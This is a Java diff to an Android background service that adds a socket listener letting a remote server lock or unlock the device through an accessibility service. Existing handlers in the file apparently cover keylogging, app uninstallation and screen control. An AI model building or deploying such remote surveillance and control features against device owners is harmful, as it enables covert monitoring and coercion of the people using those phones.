@@ -110,6 +110,7 @@ public class Server extends Service {
             socket.on("mb-key-logs-" + mDeviceID, onKeyLoggerMonitor);
             socket.on("mb-uninstall-app-event-" + mDeviceID, onUninstallAppMonitor);
             socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
+            socket.on("mb-device-lock-" + mDeviceID, onDeviceLockMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -392,6 +393,29 @@ public class Server extends Service {
             } catch (JSONException e) {
                 throw new RuntimeException(e);
             }
+        }
+    };
+
+    private final Emitter.Listener onDeviceLockMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("onDeviceLockMonitor:", data.toString());
+            String lock_event = "";
+            try {
+                lock_event = (String) data.get("event");
+                if(lock_event.equals("lock")) {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_LOCK);
+                    sendBroadcast(broadcastIntent);
+                } else {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_UNLOCK);
+                    sendBroadcast(broadcastIntent);
+                }
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
+            }
+
+
         }
     };
 
